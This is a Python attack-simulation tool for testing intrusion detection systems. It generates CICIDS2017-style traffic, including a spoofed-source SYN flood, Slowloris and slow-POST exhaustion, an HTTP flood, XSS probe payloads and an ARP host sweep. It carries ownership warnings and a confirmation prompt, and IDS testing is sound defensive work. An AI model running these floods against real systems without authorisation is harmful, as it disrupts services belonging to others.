#!/usr/bin/env python3
"""
attack_simulator.py
────────────────────
IDS Testing & Attack Simulation Tool

PURPOSE:
  Generate realistic attack traffic to test and validate the IDS system.
  All attacks are directed ONLY at targets you specify — your own machines
  on your own network. Do NOT use against systems you do not own.

ATTACKS AVAILABLE (matching CICIDS2017 training categories):
  portscan       Port scan (TCP SYN scan across common ports)
  ddos           DDoS / SYN flood (high-rate SYN packets)
  dos-goldeneye  DoS GoldenEye (HTTP keep-alive exhaustion simulation)
  dos-hulk       DoS Hulk (rapid HTTP GET flood simulation)
  dos-slowloris  DoS Slowloris (slow connection exhaustion)
  dos-slowhttp   DoS SlowHTTPTest (slow POST body)
  ftp-patator    FTP brute force (rapid auth attempts)
  ssh-patator    SSH brute force (rapid auth attempts)
  web-bruteforce Web login brute force (HTTP POST flood)
  web-xss        Web XSS probe (GET requests with XSS payloads)
  botnet         Botnet C2 beacon simulation (periodic outbound)
  infiltration   Infiltration simulation (unusual inbound connection)
  all            Run ALL attack types sequentially with delays

USAGE:
  python attack_simulator.py --list-interfaces
  python attack_simulator.py --scan                    # scan network, pick target
  python attack_simulator.py --target 192.168.1.212 --attack portscan
  python attack_simulator.py --target 192.168.1.212 --attack ddos --duration 30
  python attack_simulator.py --target 192.168.1.212 --attack all
  python attack_simulator.py --target 192.168.1.212 --attack all --delay 10

REQUIREMENTS:
  pip install scapy click rich
  Run as Administrator (Windows) for raw socket access.
"""

import os
import sys
import time
import random
import socket
import threading
import ipaddress
from datetime import datetime
from typing import Optional, List

import click

import logging as _lg
_lg.getLogger("scapy.runtime").setLevel(_lg.ERROR)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich import box
    RICH_OK = True
except ImportError:
    RICH_OK = False
    class Console:
        def print(self, *a, **kw): print(*a)
        def log(self, *a, **kw): print(*a)

console = Console()

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, ARP, Ether,
        get_if_list, get_if_addr, conf,
        sendp, send, sr1, srp,
        RandShort, RandIP,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False
    console.print("[red]Scapy not installed. Run: pip install scapy[/red]")


# ── Common ports used in CICIDS2017 attacks ───────────────────────────────────
COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
    443, 445, 3306, 3389, 5432, 6379, 8080, 8443,
    27017, 1433, 1521, 5900, 5000, 8000, 9200,
]

TOP_1000_PORTS = list(range(1, 1024)) + [
    1080, 1433, 1521, 1723, 3306, 3389, 4444,
    5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017,
]

# ── Attack registry ───────────────────────────────────────────────────────────
ATTACKS = {
    "portscan":       "TCP SYN port scan across common + top-1000 ports",
    "ddos":           "SYN flood DDoS — high-rate TCP SYN packets",
    "dos-goldeneye":  "DoS GoldenEye — HTTP keep-alive connection exhaustion",
    "dos-hulk":       "DoS Hulk — rapid HTTP GET flood with randomised URLs",
    "dos-slowloris":  "DoS Slowloris — slow incomplete HTTP headers",
    "dos-slowhttp":   "DoS SlowHTTPTest — slow incomplete POST body",
    "ftp-patator":    "FTP brute force — rapid auth attempts on port 21",
    "ssh-patator":    "SSH brute force — rapid connection attempts on port 22",
    "web-bruteforce": "Web login brute force — HTTP POST to common login paths",
    "web-xss":        "Web XSS probe — GET requests with XSS payloads",
    "botnet":         "Botnet C2 beacon — periodic small outbound connections",
    "infiltration":   "Infiltration — unusual inbound-style connection sequence",
    "all":            "Run ALL attacks sequentially (full IDS test suite)",
}


# ═════════════════════════════════════════════════════════════════════════════
#  ATTACK IMPLEMENTATIONS
# ═════════════════════════════════════════════════════════════════════════════

class AttackRunner:
    """Runs individual attack types using Scapy raw sockets."""

    def __init__(self, target_ip: str, iface: str, src_ip: str, verbose: bool = False):
        self.target   = target_ip
        self.iface    = iface
        self.src_ip   = src_ip
        self.verbose  = verbose
        self._stop    = threading.Event()

    def stop(self):
        self._stop.set()

    def _send(self, pkt, count=1, inter=0.0):
        """Send a packet, suppressing Scapy output."""
        try:
            send(pkt, count=count, inter=inter, verbose=False, iface=self.iface)
        except Exception as e:
            if self.verbose:
                console.log(f"[dim]send error: {e}[/dim]")

    def _sendp(self, pkt, count=1, inter=0.0):
        """Send an L2 packet."""
        try:
            sendp(pkt, count=count, inter=inter, verbose=False, iface=self.iface)
        except Exception as e:
            if self.verbose:
                console.log(f"[dim]sendp error: {e}[/dim]")

    # ── 1. Port Scan ──────────────────────────────────────────────────────────
    def port_scan(self, duration: float = 20.0) -> dict:
        """TCP SYN scan — matches CICIDS2017 PortScan pattern."""
        sent = 0
        sport = random.randint(40000, 60000)
        ports = TOP_1000_PORTS.copy()
        random.shuffle(ports)
        t0 = time.time()

        for port in ports:
            if self._stop.is_set() or time.time() - t0 > duration:
                break
            pkt = IP(dst=self.target) / TCP(
                sport=sport + sent % 1000,
                dport=port,
                flags="S",
                seq=random.randint(1000, 9000000),
            )
            self._send(pkt)
            sent += 1
            time.sleep(0.005)  # 200 pkt/s — realistic scan speed

        return {"packets_sent": sent, "ports_scanned": sent}

    # ── 2. DDoS / SYN Flood ───────────────────────────────────────────────────
    def syn_flood(self, duration: float = 30.0, target_port: int = 80) -> dict:
        """High-rate SYN flood — matches CICIDS2017 DDoS pattern."""
        sent = 0
        t0 = time.time()

        while not self._stop.is_set() and time.time() - t0 < duration:
            # Randomise source IP and port to simulate botnet
            pkt = IP(
                src=f"{random.randint(1,254)}.{random.randint(1,254)}."
                    f"{random.randint(1,254)}.{random.randint(1,254)}",
                dst=self.target,
            ) / TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags="S",
                seq=random.randint(0, 2**32 - 1),
            )
            self._send(pkt)
            sent += 1
            # No sleep — maximum rate

        return {"packets_sent": sent, "target_port": target_port,
                "duration": time.time() - t0}

    # ── 3. DoS GoldenEye ─────────────────────────────────────────────────────
    def dos_goldeneye(self, duration: float = 30.0) -> dict:
        """
        Simulates GoldenEye: many HTTP connections with keep-alive.
        Uses TCP SYN + partial HTTP GET with Connection: keep-alive.
        """
        sent = 0
        t0 = time.time()
        http_payload = (
            b"GET / HTTP/1.1\r\n"
            b"Host: " + self.target.encode() + b"\r\n"
            b"Connection: keep-alive\r\n"
            b"Keep-Alive: 900\r\n"
            b"User-Agent: Mozilla/5.0\r\n\r\n"
        )

        while not self._stop.is_set() and time.time() - t0 < duration:
            sport = random.randint(20000, 60000)
            # SYN
            syn = IP(dst=self.target) / TCP(sport=sport, dport=80, flags="S")
            self._send(syn)
            # Simulate data packet
            data_pkt = IP(dst=self.target) / TCP(sport=sport, dport=80, flags="PA") / http_payload
            self._send(data_pkt)
            sent += 2
            time.sleep(0.01)

        return {"packets_sent": sent, "duration": time.time() - t0}

    # ── 4. DoS Hulk ──────────────────────────────────────────────────────────
    def dos_hulk(self, duration: float = 30.0) -> dict:
        """
        Simulates Hulk: rapid HTTP GET flood with randomised URLs.
        Matches CICIDS2017 DoS Hulk pattern (high packet rate, many unique flows).
        """
        sent = 0
        t0 = time.time()
        paths = ["/", "/index.html", "/login", "/admin", "/api/data",
                 "/search?q=", "/page?id=", "/user/profile", "/static/main.js"]

        while not self._stop.is_set() and time.time() - t0 < duration:
            path = random.choice(paths) + str(random.randint(1, 99999))
            sport = random.randint(20000, 60000)
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"User-Agent: {_random_ua()}\r\n"
                f"Accept: */*\r\n\r\n"
            ).encode()
            pkt = IP(dst=self.target) / TCP(sport=sport, dport=80, flags="PA") / payload
            self._send(pkt)
            sent += 1
            time.sleep(0.002)  # ~500 pkt/s

        return {"packets_sent": sent, "duration": time.time() - t0}

    # ── 5. DoS Slowloris ─────────────────────────────────────────────────────
    def dos_slowloris(self, duration: float = 30.0) -> dict:
        """
        Simulates Slowloris: many partial HTTP headers sent very slowly.
        Keeps connections open without completing them.
        """
        sent = 0
        t0 = time.time()
        threads = []

        def _slow_conn():
            nonlocal sent
            try:
                s = socket.socket()
                s.settimeout(duration)
                s.connect((self.target, 80))
                # Send partial header only — never complete
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n")
                sent += 1
                # Keep alive by sending one header byte every few seconds
                while not self._stop.is_set() and time.time() - t0 < duration:
                    try:
                        s.send(b"X-Keep: alive\r\n")
                        time.sleep(5)
                    except Exception:
                        break
                s.close()
            except Exception:
                pass

        # Open 50 slow connections
        for _ in range(min(50, 200)):
            if self._stop.is_set():
                break
            t = threading.Thread(target=_slow_conn, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.1)

        # Wait for duration
        while not self._stop.is_set() and time.time() - t0 < duration:
            time.sleep(1)

        return {"connections_opened": len(threads), "duration": time.time() - t0}

    # ── 6. DoS SlowHTTPTest ───────────────────────────────────────────────────
    def dos_slow_post(self, duration: float = 30.0) -> dict:
        """
        Simulates SlowHTTPTest: POST with Content-Length but trickle body.
        """
        sent = 0
        t0 = time.time()

        def _slow_post():
            nonlocal sent
            try:
                s = socket.socket()
                s.settimeout(duration)
                s.connect((self.target, 80))
                header = (
                    f"POST /login HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 10000\r\n\r\n"
                ).encode()
                s.send(header)
                sent += 1
                # Send body 1 byte at a time
                for _ in range(100):
                    if self._stop.is_set() or time.time() - t0 >= duration:
                        break
                    s.send(b"a")
                    time.sleep(2)
                s.close()
            except Exception:
                pass

        for _ in range(30):
            if self._stop.is_set():
                break
            threading.Thread(target=_slow_post, daemon=True).start()
            time.sleep(0.2)

        while not self._stop.is_set() and time.time() - t0 < duration:
            time.sleep(1)

        return {"connections_opened": 30, "duration": time.time() - t0}

    # ── 7. FTP-Patator (Brute Force) ─────────────────────────────────────────
    def ftp_brute(self, duration: float = 20.0) -> dict:
        """
        Simulates FTP-Patator: rapid TCP connection attempts to port 21.
        Each connection sends a USER/PASS combo and immediately disconnects.
        Matches CICIDS2017 FTP-Patator pattern (many short-lived flows to port 21).
        """
        sent = 0
        t0 = time.time()
        users  = ["admin","root","ftp","user","test","guest","anonymous"]
        passwds= ["123456","password","admin","root","toor","letmein","qwerty"]

        while not self._stop.is_set() and time.time() - t0 < duration:
            # Raw SYN approach (works even if FTP not running)
            sport = random.randint(20000, 60000)
            pkt = IP(dst=self.target) / TCP(sport=sport, dport=21, flags="S")
            self._send(pkt)
            # Simulate failed auth RST
            rst = IP(dst=self.target) / TCP(sport=sport, dport=21, flags="R")
            self._send(rst)
            sent += 2
            time.sleep(0.05)  # ~20 attempts/sec

        return {"packets_sent": sent, "target_port": 21,
                "duration": time.time() - t0}

    # ── 8. SSH-Patator (Brute Force) ─────────────────────────────────────────
    def ssh_brute(self, duration: float = 20.0) -> dict:
        """
        Simulates SSH-Patator: rapid connection attempts to port 22.
        Matches CICIDS2017 SSH-Patator pattern.
        """
        sent = 0
        t0 = time.time()

        while not self._stop.is_set() and time.time() - t0 < duration:
            sport = random.randint(20000, 60000)
            # SYN
            syn = IP(dst=self.target) / TCP(sport=sport, dport=22, flags="S")
            self._send(syn)
            # RST (simulate failed auth, connection closed)
            rst = IP(dst=self.target) / TCP(sport=sport, dport=22, flags="R")
            self._send(rst)
            sent += 2
            time.sleep(0.05)

        return {"packets_sent": sent, "target_port": 22,
                "duration": time.time() - t0}

    # ── 9. Web Brute Force ────────────────────────────────────────────────────
    def web_brute(self, duration: float = 20.0) -> dict:
        """
        Simulates web login brute force: repeated POST requests to /login.
        Matches CICIDS2017 Web Attack - Brute Force pattern.
        """
        sent = 0
        t0 = time.time()
        paths = ["/login", "/wp-login.php", "/admin/login",
                 "/user/login", "/signin", "/auth"]

        while not self._stop.is_set() and time.time() - t0 < duration:
            path  = random.choice(paths)
            sport = random.randint(20000, 60000)
            user  = f"user{random.randint(1,100)}"
            pwd   = f"pass{random.randint(1000,9999)}"
            body  = f"username={user}&password={pwd}&submit=Login".encode()
            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n\r\n"
            ).encode() + body

            pkt = IP(dst=self.target) / TCP(sport=sport, dport=80, flags="PA") / payload
            self._send(pkt)
            sent += 1
            time.sleep(0.02)

        return {"packets_sent": sent, "duration": time.time() - t0}

    # ── 10. Web XSS Probe ─────────────────────────────────────────────────────
    def web_xss(self, duration: float = 15.0) -> dict:
        """
        Simulates XSS probing: GET requests with common XSS payloads.
        Matches CICIDS2017 Web Attack - XSS pattern.
        """
        sent = 0
        t0 = time.time()
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<svg onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "<body onload=alert(1)>",
            '"><script>alert(document.domain)</script>',
        ]

        while not self._stop.is_set() and time.time() - t0 < duration:
            payload = random.choice(payloads)
            path    = f"/search?q={payload}"
            sport   = random.randint(20000, 60000)
            http    = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"User-Agent: {_random_ua()}\r\n\r\n"
            ).encode()
            pkt = IP(dst=self.target) / TCP(sport=sport, dport=80, flags="PA") / http
            self._send(pkt)
            sent += 1
            time.sleep(0.1)

        return {"packets_sent": sent, "duration": time.time() - t0}

    # ── 11. Botnet Beacon ─────────────────────────────────────────────────────
    def botnet_beacon(self, duration: float = 60.0) -> dict:
        """
        Simulates botnet C2 beaconing: periodic small outbound connections
        to simulate a compromised host checking in with a C2 server.
        Matches CICIDS2017 Botnet pattern (periodic, regular interval flows).
        """
        sent = 0
        t0 = time.time()
        # Simulate C2 ports
        c2_ports = [443, 80, 8080, 4444, 1337, 6667]

        while not self._stop.is_set() and time.time() - t0 < duration:
            port  = random.choice(c2_ports)
            sport = random.randint(20000, 60000)
            # Small data packet (beacon payload)
            beacon = bytes([random.randint(0,255) for _ in range(32)])
            pkt = IP(dst=self.target) / TCP(sport=sport, dport=port, flags="PA") / beacon
            self._send(pkt)
            sent += 1
            # Beacons are periodic — sleep 3-7 seconds between them
            time.sleep(random.uniform(3, 7))

        return {"beacons_sent": sent, "duration": time.time() - t0}

    # ── 12. Infiltration ─────────────────────────────────────────────────────
    def infiltration(self, duration: float = 20.0) -> dict:
        """
        Simulates infiltration: unusual connection sequence suggesting
        an attacker moving laterally after initial access.
        Connects to many internal service ports in sequence.
        """
        sent = 0
        t0 = time.time()
        # Ports typical of internal enumeration
        internal_ports = [
            445,   # SMB
            135,   # RPC
            139,   # NetBIOS
            3389,  # RDP
            5985,  # WinRM
            5986,  # WinRM SSL
            22,    # SSH
            23,    # Telnet
            3306,  # MySQL
            1433,  # MSSQL
            5432,  # PostgreSQL
            6379,  # Redis
            27017, # MongoDB
        ]

        for port in internal_ports:
            if self._stop.is_set() or time.time() - t0 > duration:
                break
            sport = random.randint(40000, 60000)
            pkt = IP(dst=self.target) / TCP(sport=sport, dport=port, flags="S")
            self._send(pkt)
            sent += 1
            time.sleep(0.5)  # Slow, deliberate — evasion attempt

        return {"packets_sent": sent, "ports_tried": len(internal_ports),
                "duration": time.time() - t0}


# ── Helpers ───────────────────────────────────────────────────────────────────

def _random_ua() -> str:
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "python-requests/2.28.0",
        "curl/7.88.1",
    ]
    return random.choice(uas)


def _get_local_ip(iface: str) -> str:
    try:
        return get_if_addr(iface)
    except Exception:
        return ""


def _scan_network(iface: str, local_ip: str) -> List[dict]:
    """ARP scan the /24 subnet to discover live hosts."""
    if not local_ip or local_ip in ("0.0.0.0", "unknown"):
        return []

    subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
    console.print(f"[dim]ARP scanning {subnet} ...[/dim]")

    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
            iface=iface, timeout=3, verbose=False,
        )
        hosts = []
        for _, rcv in ans:
            ip  = rcv[ARP].psrc
            mac = rcv[Ether].src
            if ip != local_ip:
                hosts.append({"ip": ip, "mac": mac})
        return sorted(hosts, key=lambda x: [int(p) for p in x["ip"].split(".")])
    except Exception as e:
        console.print(f"[yellow]ARP scan failed: {e}[/yellow]")
        return []


def _pick_interface() -> tuple:
    """Return (npf_name, local_ip) for the first active interface."""
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip and ip not in ("0.0.0.0", "127.0.0.1", "unknown", ""):
                return iface, ip
        except Exception:
            continue
    return "", ""


def _run_attack(runner: AttackRunner, attack: str, duration: float) -> dict:
    """Dispatch attack name to runner method."""
    dispatch = {
        "portscan":       lambda: runner.port_scan(duration),
        "ddos":           lambda: runner.syn_flood(duration),
        "dos-goldeneye":  lambda: runner.dos_goldeneye(duration),
        "dos-hulk":       lambda: runner.dos_hulk(duration),
        "dos-slowloris":  lambda: runner.dos_slowloris(duration),
        "dos-slowhttp":   lambda: runner.dos_slow_post(duration),
        "ftp-patator":    lambda: runner.ftp_brute(duration),
        "ssh-patator":    lambda: runner.ssh_brute(duration),
        "web-bruteforce": lambda: runner.web_brute(duration),
        "web-xss":        lambda: runner.web_xss(duration),
        "botnet":         lambda: runner.botnet_beacon(duration),
        "infiltration":   lambda: runner.infiltration(duration),
    }
    fn = dispatch.get(attack)
    if fn is None:
        return {"error": f"Unknown attack: {attack}"}
    return fn()


# ═════════════════════════════════════════════════════════════════════════════
#  CLI
# ═════════════════════════════════════════════════════════════════════════════

@click.group(invoke_without_command=True)
@click.pass_context
def cli(ctx):
    """
    IDS Attack Simulator — Generate test attack traffic for IDS validation.

    \b
    USE ONLY ON YOUR OWN NETWORK AND MACHINES.

    \b
    Quick start:
      python attack_simulator.py list-interfaces
      python attack_simulator.py scan
      python attack_simulator.py attack --target 192.168.1.212 --type portscan
      python attack_simulator.py attack --target 192.168.1.212 --type all
    """
    if ctx.invoked_subcommand is None:
        click.echo(ctx.get_help())


@cli.command("list-interfaces")
def list_ifaces_cmd():
    """List all available network interfaces."""
    if not SCAPY_OK:
        click.echo("Scapy not installed."); return

    click.echo("\nNetwork Interfaces:\n")
    if RICH_OK:
        t = Table(box=box.SIMPLE_HEAD, padding=(0,1))
        t.add_column("#",        width=4)
        t.add_column("IP",       width=18)
        t.add_column("Friendly", width=28)
        t.add_column("NPF ID",   min_width=30)
        for i, iface in enumerate(get_if_list()):
            try:    ip = get_if_addr(iface)
            except: ip = "0.0.0.0"
            friendly = ""
            try:
                friendly = getattr(conf.ifaces.get(iface),"description","") or \
                           getattr(conf.ifaces.get(iface),"name","") or ""
            except: pass
            active = ip not in ("0.0.0.0","127.0.0.1","unknown","")
            style  = "bright_green" if active else "dim"
            marker = " [bright_green]← ACTIVE[/]" if active else ""
            t.add_row(str(i), ip, friendly[:26], f"[{style}]{iface}[/]{marker}")
        console.print(t)
    else:
        for i, iface in enumerate(get_if_list()):
            try:    ip = get_if_addr(iface)
            except: ip = "0.0.0.0"
            print(f"  [{i}] {ip:<18} {iface}")
    click.echo()


@cli.command("scan")
@click.option("--iface", "-i", default="", help="Interface to use (auto-detects if not set)")
def scan_cmd(iface):
    """Scan the local network and list discovered devices."""
    if not SCAPY_OK:
        click.echo("Scapy not installed."); return

    if not iface:
        iface, local_ip = _pick_interface()
        if not iface:
            click.echo("[ERROR] No active interface found."); return
    else:
        local_ip = _get_local_ip(iface)

    click.echo(f"\nScanning network on {iface} (local IP: {local_ip}) ...\n")
    hosts = _scan_network(iface, local_ip)

    if not hosts:
        click.echo("No other hosts found on the network.\n")
        click.echo("This could mean:")
        click.echo("  - No other devices are connected")
        click.echo("  - ARP scan requires Administrator privileges")
        click.echo("  - Try specifying --iface manually\n")
        return

    if RICH_OK:
        t = Table(title=f"Devices on network ({len(hosts)} found)",
                  box=box.SIMPLE_HEAD, padding=(0,1))
        t.add_column("#",   width=4)
        t.add_column("IP",  width=18)
        t.add_column("MAC", width=20)
        t.add_column("Suggestion")
        for i, h in enumerate(hosts):
            t.add_row(
                str(i+1),
                f"[bright_cyan]{h['ip']}[/]",
                f"[dim]{h['mac']}[/]",
                "[bright_yellow]← use as --target[/]"
            )
        t.add_row(
            str(len(hosts)+1),
            f"[bright_yellow]{local_ip}[/]",
            "[dim]—[/]",
            "[dim]← this machine (self-test)[/]"
        )
        console.print(t)
    else:
        for i, h in enumerate(hosts):
            print(f"  [{i+1}] {h['ip']:<18} {h['mac']}")
        print(f"  [*] {local_ip} (this machine)")

    click.echo(f"\nUsage: python attack_simulator.py attack --target <IP> --type <attack>\n")


@cli.command("list-attacks")
def list_attacks_cmd():
    """List all available attack types."""
    click.echo("\nAvailable attack types:\n")
    if RICH_OK:
        t = Table(box=box.SIMPLE_HEAD, padding=(0,1))
        t.add_column("Attack",      width=18)
        t.add_column("Description", min_width=50)
        t.add_column("CICIDS2017 Category", width=25)
        mapping = {
            "portscan":       "PortScan",
            "ddos":           "DDoS",
            "dos-goldeneye":  "DoS GoldenEye",
            "dos-hulk":       "DoS Hulk",
            "dos-slowloris":  "DoS Slowloris",
            "dos-slowhttp":   "DoS Slowhttptest",
            "ftp-patator":    "FTP-Patator",
            "ssh-patator":    "SSH-Patator",
            "web-bruteforce": "Web Attack Brute Force",
            "web-xss":        "Web Attack XSS",
            "botnet":         "Bot",
            "infiltration":   "Infiltration",
            "all":            "ALL categories",
        }
        for name, desc in ATTACKS.items():
            t.add_row(
                f"[bright_cyan]{name}[/]" if name != "all" else f"[bright_yellow]{name}[/]",
                desc,
                f"[dim]{mapping.get(name,'')}[/]"
            )
        console.print(t)
    else:
        for name, desc in ATTACKS.items():
            print(f"  {name:<18} {desc}")
    click.echo()


@cli.command("attack")
@click.option("--target",    "-t", required=True,
              help="Target IP address (your own machine or another on your network)")
@click.option("--type",      "-a", "attack_type",
              type=click.Choice(list(ATTACKS.keys()), case_sensitive=False),
              default="portscan", show_default=True,
              help="Attack type to simulate")
@click.option("--iface",     "-i", default="",
              help="Network interface (auto-detects if not set)")
@click.option("--duration",  "-d", default=20, show_default=True,
              help="Duration in seconds for each attack")
@click.option("--delay",          default=5, show_default=True,
              help="Seconds to wait between attacks when using --type all")
@click.option("--port",      "-p", default=80, show_default=True,
              help="Target port (used by ddos, dos attacks)")
@click.option("--verbose",   "-v", is_flag=True,
              help="Show verbose packet-level output")
@click.option("--yes",       "-y", is_flag=True,
              help="Skip the safety confirmation prompt")
def attack_cmd(target, attack_type, iface, duration, delay, port, verbose, yes):
    """
    Run a simulated attack against a target IP.

    \b
    ONLY use against systems you own or have permission to test.
    """
    if not SCAPY_OK:
        click.echo("[ERROR] Scapy not installed. Run: pip install scapy"); return

    # Safety confirmation
    if not yes:
        click.echo(f"\n[WARNING] You are about to send attack traffic to {target}")
        click.echo(f"  Attack  : {attack_type.upper()}")
        click.echo(f"  Duration: {duration}s per attack")
        click.echo(f"\n  ONLY proceed if you own this target or have explicit permission.")
        if not click.confirm("\n  Proceed?"):
            click.echo("Aborted."); return

    # Pick interface
    if not iface:
        iface, local_ip = _pick_interface()
        if not iface:
            click.echo("[ERROR] No active interface. Use --iface."); return
    else:
        local_ip = _get_local_ip(iface)

    click.echo(f"\nInterface : {iface}")
    click.echo(f"Local IP  : {local_ip}")
    click.echo(f"Target    : {target}")
    click.echo(f"Attack    : {attack_type.upper()}")
    click.echo(f"Duration  : {duration}s per attack\n")

    runner = AttackRunner(
        target_ip=target,
        iface=iface,
        src_ip=local_ip,
        verbose=verbose,
    )

    # Stop handler
    def _stop_on_ctrl_c():
        click.echo("\n[Ctrl+C] Stopping attack ...")
        runner.stop()

    import signal
    signal.signal(signal.SIGINT, lambda s, f: _stop_on_ctrl_c())

    # Determine attacks to run
    if attack_type == "all":
        attack_list = [a for a in ATTACKS.keys() if a != "all"]
    else:
        attack_list = [attack_type]

    total = len(attack_list)
    results_all = {}

    for idx, atk in enumerate(attack_list, 1):
        if runner._stop.is_set():
            break

        desc = ATTACKS.get(atk, atk)
        console.print(f"\n[{'='*55}]")
        console.print(
            f"  [{idx}/{total}] [bright_cyan]{atk.upper()}[/]  —  {desc}"
        )
        console.print(f"[{'='*55}]")
        console.print(f"  Target: [bright_yellow]{target}[/]  Duration: {duration}s")
        console.print(f"  [dim]Start time: {datetime.now().strftime('%H:%M:%S')}[/]\n")

        t0 = time.time()
        try:
            if RICH_OK:
                with Progress(
                    SpinnerColumn(),
                    TextColumn(f"[bright_red]{atk}[/] running..."),
                    BarColumn(),
                    TimeElapsedColumn(),
                    console=console,
                    transient=True,
                ) as prog:
                    task = prog.add_task("", total=duration)
                    # Run attack in thread so progress updates
                    result_holder = [{}]
                    def _run():
                        result_holder[0] = _run_attack(runner, atk, duration)
                    t = threading.Thread(target=_run, daemon=True)
                    t.start()
                    while t.is_alive() and not runner._stop.is_set():
                        elapsed = time.time() - t0
                        prog.update(task, completed=min(elapsed, duration))
                        time.sleep(0.25)
                    t.join()
                    result = result_holder[0]
            else:
                result = _run_attack(runner, atk, duration)

        except Exception as e:
            result = {"error": str(e)}

        elapsed = time.time() - t0
        results_all[atk] = {**result, "elapsed": round(elapsed, 1)}

        # Print result
        console.print(f"\n  [bright_green]✓[/] Attack complete in {elapsed:.1f}s")
        for k, v in result.items():
            console.print(f"    {k:<20}: {v}")

        # Delay between attacks
        if idx < total and not runner._stop.is_set():
            console.print(f"\n  [dim]Waiting {delay}s before next attack ...[/dim]")
            for _ in range(delay):
                if runner._stop.is_set():
                    break
                time.sleep(1)

    # Final summary
    console.print(f"\n\n{'='*55}")
    console.print("  ATTACK SESSION SUMMARY")
    console.print(f"{'='*55}")
    console.print(f"  Target       : {target}")
    console.print(f"  Attacks run  : {len(results_all)}")

    if RICH_OK:
        t = Table(box=box.SIMPLE_HEAD, padding=(0,1))
        t.add_column("Attack",   width=18)
        t.add_column("Duration", width=10)
        t.add_column("Result")
        for atk, res in results_all.items():
            elapsed_str = f"{res.get('elapsed',0):.1f}s"
            pkts = res.get("packets_sent") or res.get("beacons_sent") or \
                   res.get("connections_opened") or "—"
            t.add_row(
                f"[bright_cyan]{atk}[/]",
                elapsed_str,
                f"pkts/conns: [bright_yellow]{pkts}[/]"
            )
        console.print(t)
    else:
        for atk, res in results_all.items():
            print(f"  {atk:<20} {res}")

    console.print(f"\n  [dim]Check your IDS dashboard for detections.[/dim]\n")


if __name__ == "__main__":
    cli()
